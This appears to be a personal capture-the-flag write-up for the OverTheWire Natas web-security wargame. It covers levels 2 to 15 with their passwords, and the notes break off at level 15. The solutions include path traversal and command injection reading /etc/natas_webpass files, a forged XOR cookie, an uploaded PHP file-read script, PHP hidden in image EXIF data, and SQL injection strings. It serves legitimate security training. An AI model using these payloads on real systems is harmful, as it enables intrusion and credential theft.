---
title: Natas
---

- [natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi](#natas2zluruathqk7q2mqmdetiuij2zvwy2mbi)
- [natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14](#natas3sjijnw6ucpu6hpz1zachadtwd7ogrd14)
- [natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ](#natas4z9tkrkwmpt9qr7xrr5jwrkgou901swez)
- [natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq](#natas5ix6iofmpn7ayoqgpwtn3fxpbajvjchfq)
- [natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1](#natas6agoy4q2dc6mgdq4ol4ytoktyag9peha1)
- [natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9](#natas77z3heenjqtflzgnt29q7wavmnfzdh0i9)
- [natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe](#natas8dbfubfqqg69kvjvj1iabmoipwsnq9bwe)
- [natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl](###natas9w0mmhucrrng8dcghe4qvk3ja9lgt8ndl)
- [natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu](#natas10nopp1igqakuzai1guujzn1bfvj7xcnzu)
- [natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK](#natas11u82q5tcmmq9xufoi3dyx61s7ozd9jkok)
- [natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3](#natas12edxp0ps26wlkhzy1rdbpuzk0rkflgir3)
- [natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY](#natas13jmlty0qipzbbakc9341cqpqzbjv7mqby)
- [natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1](#natas14lg96m10tdfapyvbkjdjymbllq5l6qdl1)
- [natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J](#natas15awwj0w5cvxrziongz9j5stnvkmxdk39j)


/etc/natas_webpass/natas#

### natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

Saw image at /files/, go to to /files, found users.txt

### natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

Source says "not Google" → robots.txt

/s3cr3t/ → users.txt

### natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

change html referer using Tamper Data extension for FF

### natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

not logged in

no /login, /admin

check cookies, value loggedin=0, change to 1

### natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

source code mentions includes/secret.inc, visit that, ?$secret = "FOEIUWGHFEEUHOFUOIU";?

### natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

source code has hint: password for webuser natas8 is in /etc/natas_webpass/natas8

url style is [http://natas7.natas.labs.overthewire.org/index.php?page=home](http://natas7.natas.labs.overthewire.org/index.php?page=home)

[http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)

### natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

source code

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

so encoded → hex2bin → reverse → base64 decode (cyberchef)

oubWYf2kBq

### natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

source code, passthru("grep -i $key dictionary.txt");

input as test; cat /etc/natas_webpass/natas10 → ; causes multiple commands

### natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

break grep command, also search /etc/natas_webpass/natas11 → input ".* /etc/natas_webpass/natas11"

### natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

if($data["showpassword"] == "yes") {
print "The password for natas12 is <censored><br>";
}

cookie data is ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D

```php
<?php

# $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"]))
# $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
# setcookie("data", base64_encode(xor_encrypt(json_encode($d))));

$cookie = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D';

function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); 
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(base64_decode($cookie));

?>
```

echo is, therefore xor key is, qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq (note repeats)

replace script with key and yes

```php
<?php

$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode($data)));  

?>
```

returns ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

change cookie data, refresh page

### natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

upload 1kg jpg

 "The file upload/cb0xgg2bgm.jpg has been uploaded" goes to [http://natas12.natas.labs.overthewire.org/upload/ayhmkw66he.jpg](http://natas12.natas.labs.overthewire.org/upload/ayhmkw66he.jpg)

filename is random so can't use that

can upload text file, renamed to stuff.jpg

hidden inputs, including filename - can change filename

rename to php

```php
<?php readfile("/etc/natas_webpass/natas13") ?>
```

### natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

same but only image files, not .txt or .php.jpg or .jpg.php

can inject php into exif jfif header

$ exiftool -artist='<?php echo "start >>>"; readfile("/etc/natas_webpass/natas14"); echo "<<< end" ?>' sfghj.jpg

����JFIF,,���ExifMM*JR(;RZ,,start >>>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 <<< end��C������������������������������������������������������������������C������������������������������������������������������������������������#��������?����?����?����?!�������?����?����?��

### natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

username and password

if(mysql_num_rows(mysql_query($query, $link)) > 0) {
echo "Successful login! The password for natas15 is <censored><br>";

google sql injection to bypass, ' or 1=1 -- doesn't work but " or 1=1 -- does (check source, it uses "s) (for username AND password) (or " or true --)

### natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

username, check existence

- admin, NULL, >64 chars: doesn't exist
- " or 1=1 --: error → no res (response from query)